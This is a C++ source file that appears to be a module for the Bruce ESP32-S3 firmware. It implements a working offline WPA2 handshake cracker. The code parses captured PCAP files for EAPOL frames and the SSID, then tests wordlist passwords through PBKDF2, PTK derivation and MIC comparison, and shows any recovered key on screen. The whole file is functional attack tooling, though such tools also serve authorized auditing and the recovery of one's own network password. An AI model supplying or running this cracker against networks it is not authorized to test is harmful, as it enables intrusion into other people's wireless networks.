// --- wifi_recover.cpp ---
/*
  WiFi Password Cracker for Bruce (ESP32-S3 / T-Embed)
  - Reads passwords from wordlist file
  - Tests against PCAP handshake using PBKDF2 + PMK verification
  - Single unified workflow
*/

#include "wifi_recover.h"

// Bruce core includes
#include "core/display.h"
#include "core/menu_items/WifiMenu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/settings.h"
#include "core/utils.h"

#include "esp_log.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_rom_crc.h"
#include "mbedtls/md.h"

#include <string.h>
#include <string>

static const char *TAG = "wifi_crack";

/* ----------------- Handshake data structure ----------------- */
struct HandshakeData {
    bool valid;
    uint8_t ap_mac[6];
    uint8_t sta_mac[6];
    uint8_t anonce[32];
    uint8_t snonce[32];
    uint8_t eapol[256];
    uint16_t eapol_len;
    uint8_t mic[16];
    char ssid[33];
};

/* ----------------- Globals for abort handling ----------------- */
static volatile bool g_abortRequested = false; // set when user aborts

static inline void poll_user_abort() {
    // check(AnyKeyPress) is part of your codebase; this polls input and sets abort flag
    if (check(AnyKeyPress)) { g_abortRequested = true; }
}

/* ----------------- Utilities ----------------- */
static inline uint64_t now_us() { return esp_timer_get_time(); }

static inline uint32_t swap32(uint32_t x) {
    return ((x >> 24) & 0x000000FF) | ((x >> 8) & 0x0000FF00) | ((x << 8) & 0x00FF0000) |
           ((x << 24) & 0xFF000000);
}

/* ----------------- PCAP Parser ----------------- */
#pragma pack(push, 1)
struct pcap_hdr_t {
    uint32_t magic;
    uint16_t vmaj, vmin;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
};

struct pcaprec_hdr_t {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

// Extract SSID from beacon frame
static String extract_ssid_from_beacon(const uint8_t *frame, size_t len) {
    if (len < 36) return "";

    // Beacon frame structure: MAC header (24) + Fixed params (12) + Tagged params
    size_t offset = 36;

    while (offset + 1 < len) {
        uint8_t tag_num = frame[offset];
        uint8_t tag_len = frame[offset + 1];

        if (offset + 2 + tag_len > len) break;

        // Tag 0 = SSID
        if (tag_num == 0x00) {
            String ssid = "";
            for (int i = 0; i < tag_len && i < 32; ++i) {
                char c = frame[offset + 2 + i];
                if (c >= 32 && c <= 126) ssid += c;
                else ssid += '_';
            }
            return ssid;
        }
        offset += 2 + tag_len;
    }
    return "";
}

static bool parse_pcap_handshake(FS &fs, const String &path, HandshakeData &hs) {
    memset(&hs, 0, sizeof(hs));
    hs.valid = false;

    File f = fs.open(path, FILE_READ);
    if (!f) {
        ESP_LOGW(TAG, "Cannot open PCAP: %s", path.c_str());
        padprintln("Error: Cannot open PCAP file");
        return false;
    }

    pcap_hdr_t gh;
    if (f.read((uint8_t *)&gh, sizeof(gh)) != sizeof(gh)) {
        padprintln("Error: Cannot read PCAP header");
        f.close();
        return false;
    }

    bool swapped = false;
    if (gh.magic == 0xa1b2c3d4) {
        swapped = false;
    } else if (gh.magic == 0xd4c3b2a1) {
        swapped = true;
        gh.network = swap32(gh.network);
    } else {
        padprintln("Error: Invalid PCAP magic");
        f.close();
        return false;
    }

    // Bruce uses network type 105 (802.11 raw, no radiotap)
    if (gh.network != 105) { padprintf("Warning: Network type %u (expected 105)\n", gh.network); }

    bool have_m1 = false, have_m2 = false, have_m3 = false, have_m4 = false;
    bool have_beacon = false;
    const size_t MAX_PKT_READ = 8192;
    int packet_count = 0;

    while (f.available() && !(have_m2 && have_m3)) {
        pcaprec_hdr_t ph;
        if (f.read((uint8_t *)&ph, sizeof(ph)) != sizeof(ph)) break;

        uint32_t incl_len = swapped ? swap32(ph.incl_len) : ph.incl_len;
        if (incl_len == 0 || incl_len > 256 * 1024) {
            if (incl_len > 0 && incl_len < 1000000) { f.seek(f.position() + incl_len); }
            continue;
        }

        size_t read_sz = (incl_len > MAX_PKT_READ) ? MAX_PKT_READ : incl_len;
        uint8_t *pkt = (uint8_t *)malloc(read_sz);
        if (!pkt) break;

        if (f.read(pkt, read_sz) != (int)read_sz) {
            free(pkt);
            break;
        }

        if (read_sz < incl_len) { f.seek(f.position() + (incl_len - read_sz)); }

        packet_count++;

        // Bruce PCAP has NO radiotap - start directly at 802.11 header
        size_t pos = 0;

        // Parse 802.11 header (minimum 24 bytes)
        if (pos + 24 > incl_len) {
            free(pkt);
            continue;
        }

        uint16_t fc = (uint16_t)(pkt[pos] | (pkt[pos + 1] << 8));
        uint8_t frame_type = (fc & 0x0C) >> 2;
        uint8_t frame_subtype = (fc & 0xF0) >> 4;
        bool to_ds = fc & 0x0100;
        bool from_ds = fc & 0x0200;

        uint8_t *addr1 = pkt + pos + 4;
        uint8_t *addr2 = pkt + pos + 10;
        uint8_t *addr3 = pkt + pos + 16;

        // Determine AP and STA addresses
        uint8_t ap_addr[6], sta_addr[6];
        if (from_ds && !to_ds) {
            // From AP to STA
            memcpy(ap_addr, addr2, 6);  // BSSID/Source
            memcpy(sta_addr, addr1, 6); // Destination
        } else if (!from_ds && to_ds) {
            // From STA to AP
            memcpy(ap_addr, addr1, 6);  // BSSID/Destination
            memcpy(sta_addr, addr2, 6); // Source
        } else {
            memcpy(ap_addr, addr3, 6); // BSSID
            memcpy(sta_addr, addr2, 6);
        }

        // Check for beacon frame (type=0, subtype=8)
        if (frame_type == 0 && frame_subtype == 8 && !have_beacon) {
            String ssid = extract_ssid_from_beacon(pkt, incl_len);
            if (ssid.length() > 0) {
                strncpy(hs.ssid, ssid.c_str(), sizeof(hs.ssid) - 1);
                hs.ssid[sizeof(hs.ssid) - 1] = '\0';
                memcpy(hs.ap_mac, addr2, 6); // BSSID from source address in beacon
                have_beacon = true;
                ESP_LOGI(TAG, "Found beacon: SSID=%s", hs.ssid);
            }
        }

        // Data frame check (type=2)
        if (frame_type != 2) {
            free(pkt);
            continue;
        }

        size_t hdr_len = 24;
        // QoS frames have 2 extra bytes
        if (fc & 0x0080) hdr_len += 2;
        pos += hdr_len;

        if (pos + 8 > incl_len) {
            free(pkt);
            continue;
        }

        // Check LLC SNAP for EAPOL (0xAA 0xAA 0x03 ... 0x88 0x8E)
        if (pkt[pos] != 0xAA || pkt[pos + 1] != 0xAA || pkt[pos + 2] != 0x03) {
            free(pkt);
            continue;
        }

        uint16_t ethertype = (uint16_t)((pkt[pos + 6] << 8) | pkt[pos + 7]);
        pos += 8;

        if (ethertype != 0x888E) {
            free(pkt);
            continue;
        }

        // Parse EAPOL
        if (pos + 4 > incl_len) {
            free(pkt);
            continue;
        }
        uint8_t *eapol = pkt + pos;
        uint16_t eapol_len = (uint16_t)((eapol[2] << 8) | eapol[3]);

        if ((size_t)(pos + 4 + eapol_len) > incl_len) {
            free(pkt);
            continue;
        }

        uint8_t *key = eapol + 4;
        if ((size_t)(key - pkt) + 95 > read_sz) {
            free(pkt);
            continue;
        }

        // Key information at offset 1-2 in EAPOL-Key
        uint16_t key_info = (uint16_t)((key[1] << 8) | key[2]);
        bool mic_set = (key_info & 0x0100) != 0;
        bool ack = (key_info & 0x0080) != 0;
        bool install = (key_info & 0x0040) != 0;
        bool secure = (key_info & 0x0200) != 0;

        uint8_t *nonce = key + 13;
        uint8_t *mic = key + 77;

        // Classify EAPOL message
        int msg_num = -1;
        if (ack && !mic_set && !install) msg_num = 1;                 // M1
        else if (!ack && mic_set && !install && !secure) msg_num = 2; // M2
        else if (ack && mic_set && install) msg_num = 3;              // M3
        else if (!ack && mic_set && !install && secure) msg_num = 4;  // M4

        if (msg_num == 1) {
            memcpy(hs.anonce, nonce, 32);
            memcpy(hs.ap_mac, ap_addr, 6);
            have_m1 = true;
            ESP_LOGI(TAG, "Found M1 (ANonce)");
        } else if (msg_num == 2) {
            memcpy(hs.snonce, nonce, 32);
            memcpy(hs.mic, mic, 16);
            memcpy(hs.sta_mac, sta_addr, 6);
            memcpy(hs.ap_mac, ap_addr, 6);

            size_t cp_len = (eapol_len + 4) <= sizeof(hs.eapol) ? (eapol_len + 4) : sizeof(hs.eapol);
            memcpy(hs.eapol, eapol, cp_len);
            hs.eapol_len = (uint16_t)cp_len;
            have_m2 = true;
            ESP_LOGI(TAG, "Found M2 (SNonce + MIC)");
        } else if (msg_num == 3) {
            memcpy(hs.anonce, nonce, 32);
            memcpy(hs.ap_mac, ap_addr, 6);
            have_m3 = true;
            ESP_LOGI(TAG, "Found M3 (ANonce)");
        } else if (msg_num == 4) {
            have_m4 = true;
            ESP_LOGI(TAG, "Found M4");
        }

        free(pkt);
    }

    f.close();

    if (!have_m2) {
        ESP_LOGW(TAG, "Missing M2");
        padprintln("Error: No M2 in PCAP");
        return false;
    }

    if (!have_m1 && !have_m3) {
        ESP_LOGW(TAG, "Missing M1/M3");
        padprintln("Error: Need M1 or M3");
        return false;
    }

    hs.valid = true;
    return true;
}

/* ----------------- PBKDF2 Implementation ----------------- */
/*
 * PBKDF2 now polls for user input on each iteration so the user can abort
 * during the heavy work. Returns:
 *  0 = ok
 * -1/-2/-3 = error (as before)
 * -4 = aborted by user
 */
static int pbkdf2_hmac_sha1(
    const unsigned char *password, size_t plen, const unsigned char *salt, size_t slen,
    unsigned int iterations, size_t dklen, unsigned char *output
) {
    if (!password || !salt || !output || iterations == 0) return -1;

    const mbedtls_md_info_t *md_info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    if (!md_info) return -2;

    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    if (mbedtls_md_setup(&ctx, md_info, 1) != 0) {
        mbedtls_md_free(&ctx);
        return -3;
    }

    const size_t hlen = 20;
    size_t l = (dklen + hlen - 1) / hlen;
    unsigned char U[20], T[20], int_block[4];

    for (size_t block = 1; block <= l; ++block) {
        // Abort check
        if (g_abortRequested) {
            mbedtls_md_free(&ctx);
            return -4;
        }

        int_block[0] = (block >> 24) & 0xff;
        int_block[1] = (block >> 16) & 0xff;
        int_block[2] = (block >> 8) & 0xff;
        int_block[3] = block & 0xff;

        mbedtls_md_hmac_starts(&ctx, password, plen);
        mbedtls_md_hmac_update(&ctx, salt, slen);
        mbedtls_md_hmac_update(&ctx, int_block, 4);
        mbedtls_md_hmac_finish(&ctx, U);

        memcpy(T, U, hlen);

        for (unsigned int iter = 1; iter < iterations; ++iter) {
            // Poll user in inner PBKDF2 loop too
            if (g_abortRequested) {
                mbedtls_md_free(&ctx);
                return -4;
            }

            mbedtls_md_hmac_reset(&ctx);
            mbedtls_md_hmac_update(&ctx, U, hlen);
            mbedtls_md_hmac_finish(&ctx, U);
            for (size_t k = 0; k < hlen; ++k) T[k] ^= U[k];

            // Yield briefly so other tasks (input) can run
            if ((iter & 0x1FF) == 0) vTaskDelay(pdMS_TO_TICKS(1));
        }

        size_t offset = (block - 1) * hlen;
        size_t to_copy = (offset + hlen > dklen) ? (dklen - offset) : hlen;
        memcpy(output + offset, T, to_copy);
    }

    mbedtls_md_free(&ctx);
    return 0;
}

/* ----------------- PTK Derivation (PRF-512) ----------------- */
/*
 * derive_ptk now returns 'false' if the user aborted during the small loop.
 */
static bool derive_ptk(
    const uint8_t *pmk, const uint8_t *ap_mac, const uint8_t *sta_mac, const uint8_t *anonce,
    const uint8_t *snonce, uint8_t *ptk_out
) {
    uint8_t data[100];
    size_t pos = 0;

    // MAC ordering (min first)
    if (memcmp(ap_mac, sta_mac, 6) < 0) {
        memcpy(data + pos, ap_mac, 6);
        pos += 6;
        memcpy(data + pos, sta_mac, 6);
        pos += 6;
    } else {
        memcpy(data + pos, sta_mac, 6);
        pos += 6;
        memcpy(data + pos, ap_mac, 6);
        pos += 6;
    }

    // Nonce ordering (min first)
    if (memcmp(anonce, snonce, 32) < 0) {
        memcpy(data + pos, anonce, 32);
        pos += 32;
        memcpy(data + pos, snonce, 32);
        pos += 32;
    } else {
        memcpy(data + pos, snonce, 32);
        pos += 32;
        memcpy(data + pos, anonce, 32);
        pos += 32;
    }

    // WPA2 uses PRF-512 to generate 64 bytes of PTK
    const char *label = "Pairwise key expansion";

    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_setup(&ctx, md, 1);

    // Generate PTK in 20-byte blocks (SHA1 output size)
    for (int i = 0; i < 4; i++) { // 4 iterations for 64 bytes
        // Abort check
        if (g_abortRequested) {
            mbedtls_md_free(&ctx);
            return false;
        }

        uint8_t counter = (uint8_t)i;

        mbedtls_md_hmac_starts(&ctx, pmk, 32);
        mbedtls_md_hmac_update(&ctx, (const uint8_t *)label, strlen(label));
        mbedtls_md_hmac_update(&ctx, (const uint8_t *)"\0", 1); // null terminator
        mbedtls_md_hmac_update(&ctx, data, pos);
        mbedtls_md_hmac_update(&ctx, &counter, 1);

        uint8_t hash[20];
        mbedtls_md_hmac_finish(&ctx, hash);

        size_t copy_len = (i == 3) ? 4 : 20; // Last block only 4 bytes (64 total)
        memcpy(ptk_out + (i * 20), hash, copy_len);

        mbedtls_md_hmac_reset(&ctx);
        // give up CPU briefly to keep UI/input responsive
        taskYIELD();
    }

    mbedtls_md_free(&ctx);
    return true;
}

/* ----------------- MIC Verification ----------------- */
static bool verify_mic(const HandshakeData &hs, const uint8_t *ptk) {
    const uint8_t *kck = ptk; // KCK is first 16 bytes of PTK

    uint8_t eapol_copy[256];
    memcpy(eapol_copy, hs.eapol, hs.eapol_len);

    // Zero out MIC field (at offset 77 in EAPOL-Key, offset 81 in full EAPOL)
    memset(eapol_copy + 81, 0, 16);

    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);

    const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_setup(&ctx, md, 1);
    mbedtls_md_hmac_starts(&ctx, kck, 16);
    mbedtls_md_hmac_update(&ctx, eapol_copy, hs.eapol_len);

    uint8_t computed_mic[20];
    mbedtls_md_hmac_finish(&ctx, computed_mic);
    mbedtls_md_free(&ctx);

    return memcmp(computed_mic, hs.mic, 16) == 0;
}

/* ----------------- Main Cracking Function ----------------- */
void wifi_crack_handshake(const String &wordlist_path, const String &pcap_path) {
    // reset abort flag
    g_abortRequested = false;

    resetTftDisplay();
    drawMainBorderWithTitle("WiFi Password Recover", true);
    padprintln("");

    FS *fs = nullptr;
    if (!getFsStorage(fs)) {
        displayError("No filesystem available", true);
        return;
    }

    // Parse handshake
    HandshakeData hs;
    if (!parse_pcap_handshake(*fs, pcap_path, hs)) {
        displayError("Failed to parse handshake", true);
        vTaskDelay(pdMS_TO_TICKS(3000));
        return;
    }
    padprintf("SSID: %s\n", hs.ssid[0] ? hs.ssid : "(not found)");
    padprintf(
        "AP: %02X:%02X:%02X:%02X:%02X:%02X\n",
        hs.ap_mac[0],
        hs.ap_mac[1],
        hs.ap_mac[2],
        hs.ap_mac[3],
        hs.ap_mac[4],
        hs.ap_mac[5]
    );
    padprintln("");

    // If no SSID in PCAP, ask user
    if (hs.ssid[0] == '\0') {
        padprintln("SSID not found in PCAP");
        String ssid = keyboard("", 32, "Enter SSID:");
        if (ssid.length() == 0) {
            displayError("SSID required", true);
            return;
        }
        strncpy(hs.ssid, ssid.c_str(), sizeof(hs.ssid) - 1);
        resetTftDisplay();
        drawMainBorderWithTitle("WiFi Password Recover", true);
        padprintln("");
        padprintf("SSID: %s\n", hs.ssid);
        padprintln("");
    }

    // Open wordlist
    File wf = fs->open(wordlist_path, FILE_READ);
    if (!wf) {
        displayError("Cannot open wordlist", true);
        return;
    }

    // Start Recovering
    padprintln("Recovering...");
    padprintln("(Press SEL to abort at any time)"); // clearer instruction
    padprintln("");

    uint64_t start_time = now_us();
    uint32_t attempts = 0;
    bool found = false;
    String found_password;

    char password[128];
    uint8_t pmk[32];
    uint8_t ptk[64];

    // Main loop
    while (wf.available() && !found && !g_abortRequested) {
        // Poll early for abort (avoid being stuck at file reading)
        poll_user_abort();
        if (g_abortRequested) break;

        String line = wf.readStringUntil('\n');
        line.trim();

        // quick UI heartbeat (so the display doesn't look frozen)
        if ((attempts & 0x3FF) == 0) { taskYIELD(); }

        if (line.length() == 0 || line[0] == '#') continue;
        if (line.length() < 8 || line.length() > 63) continue;

        strncpy(password, line.c_str(), sizeof(password) - 1);
        password[sizeof(password) - 1] = '\0';

        // Compute PMK (may be heavy) — pbkdf2 now checks g_abortRequested internally
        int pbkdf2_res = pbkdf2_hmac_sha1(
            (const unsigned char *)password,
            strlen(password),
            (const unsigned char *)hs.ssid,
            strlen(hs.ssid),
            4096,
            32,
            pmk
        );

        if (pbkdf2_res == -4 || g_abortRequested) {
            g_abortRequested = true;
            break;
        }
        if (pbkdf2_res != 0) {
            // Some error; skip this password
            attempts++;
            continue;
        }

        // Derive PTK (small loop) - returns false if aborted
        if (!derive_ptk(pmk, hs.ap_mac, hs.sta_mac, hs.anonce, hs.snonce, ptk)) {
            g_abortRequested = true;
            break;
        }

        // Verify MIC
        if (verify_mic(hs, ptk)) {
            found = true;
            found_password = String(password);
            break;
        }

        attempts++;

        // Update UI every 10 attempts for a snappier UI (but not every single attempt to avoid spamming draw)
        if ((attempts % 10) == 0) {
            uint64_t elapsed = now_us() - start_time;
            double rate = (elapsed > 0) ? (attempts * 1000000.0 / elapsed) : 0;
            double seconds = elapsed / 1000000.0;
            padprintf("\rAttempts: %u  %.1f/s  Time: %.1fs   ", attempts, rate, seconds);

            // show a small "current candidate" snippet (trim to fit)
            String cand = line;
            if (cand.length() > 20) { cand = cand.substring(0, 17) + "..."; }
            padprintf("Cur: %s", cand.c_str());

            // small yield so button checks in other contexts can run
            vTaskDelay(pdMS_TO_TICKS(1));

            // immediate abort check
            poll_user_abort();
            if (g_abortRequested) break;
        }
    }

    wf.close();

    if (g_abortRequested) {
        padprintln("");
        padprintln("");
        padprintln("Aborted by user");
        vTaskDelay(pdMS_TO_TICKS(1000));
        return;
    }

    uint64_t total_time = now_us() - start_time;
    double seconds = total_time / 1000000.0;

    padprintln("");
    padprintln("");
    padprintf("Tested: %u passwords\n", attempts);
    padprintf("Time: %.1f sec (%.1f/sec)\n", seconds, attempts / (seconds > 0 ? seconds : 1.0));
    padprintln("");

    /* ----------------- Improved result UI (tidy & minimal) ----------------- */
    if (found) {
        // Clear and redraw a fresh result screen so the password line is always visible.
        resetTftDisplay(); // << UI TIDY
        drawMainBorderWithTitle("WiFi Password Cracker", true);
        padprintln("");

        // Single green title line
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        padprintln("PASSWORD FOUND!");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

        padprintln(""); // small gap

        // Show SSID line
        padprintf("SSID: %s\n", hs.ssid[0] ? hs.ssid : "(not found)");

        // Trim long passwords so they fit on one line; keep head+tail for readability.
        String display_pw = found_password;
        const int MAX_DISPLAY_LEN = 28; // tune to your visible width
        if (display_pw.length() > MAX_DISPLAY_LEN) {
            int head = 14;
            int tail = MAX_DISPLAY_LEN - head - 3; // for "..."
            if (tail < 3) tail = 3;
            display_pw =
                display_pw.substring(0, head) + "..." + display_pw.substring(display_pw.length() - tail);
        }

        // Password line
        padprintf("Password: %s\n", display_pw.c_str());

        padprintln(""); // small gap

        // Simple prompt and wait. No modal/overlay called.
        padprintln("Press any key to continue...");
        // Wait for user to acknowledge so they can read the password
        while (!check(AnyKeyPress)) { vTaskDelay(pdMS_TO_TICKS(50)); }

    } else {
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        padprintln("Password not found");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        displayError("No match", true);
        vTaskDelay(pdMS_TO_TICKS(3000));
    }

    vTaskDelay(pdMS_TO_TICKS(200));
}

/* ----------------- Menu Entry Point ----------------- */
void wifi_recover_menu() {
    resetTftDisplay();
    drawMainBorderWithTitle("WiFi Cracker", true);
    padprintln("");

    FS *fs = nullptr;
    if (!getFsStorage(fs)) {
        displayError("No filesystem", true);
        return;
    }

    // Ensure wordlists folder exists, create if needed
    const String WORDLIST_DIR = "/wordlists";
    if (!(*fs).exists(WORDLIST_DIR)) {
        if ((*fs).mkdir(WORDLIST_DIR)) {
            padprintf("Created folder: %s\n", WORDLIST_DIR.c_str());
        } else {
            padprintf("Warning: failed to create %s\n", WORDLIST_DIR.c_str());
            // proceed anyway and let loopSD show root as fallback
        }
    }

    // Select wordlist (start inside /wordlists)
    padprintln("Select wordlist...");
    String wordlist = loopSD(*fs, true, "txt|lst|csv|*", WORDLIST_DIR);
    if (wordlist.length() == 0) {
        displayInfo("Cancelled", true);
        return;
    }

    // Ensure BrucePCAP folder exists, create if needed
    const String PCAP_DIR = "/BrucePCAP";
    if (!(*fs).exists(PCAP_DIR)) {
        if ((*fs).mkdir(PCAP_DIR)) {
            padprintf("Created folder: %s\n", PCAP_DIR.c_str());
        } else {
            padprintf("Warning: failed to create %s\n", PCAP_DIR.c_str());
            // proceed anyway
        }
    }

    // Select PCAP (start inside /BrucePCAP)
    resetTftDisplay();
    drawMainBorderWithTitle("WiFi Cracker", true);
    padprintln("");
    padprintln("Select PCAP handshake...");
    String pcap = loopSD(*fs, true, "pcap|cap|*", PCAP_DIR);
    if (pcap.length() == 0) {
        displayInfo("Cancelled", true);
        return;
    }

    // Run cracker
    wifi_crack_handshake(wordlist, pcap);

    // Wait for keypress
    while (!check(AnyKeyPress)) { vTaskDelay(pdMS_TO_TICKS(50)); }
}
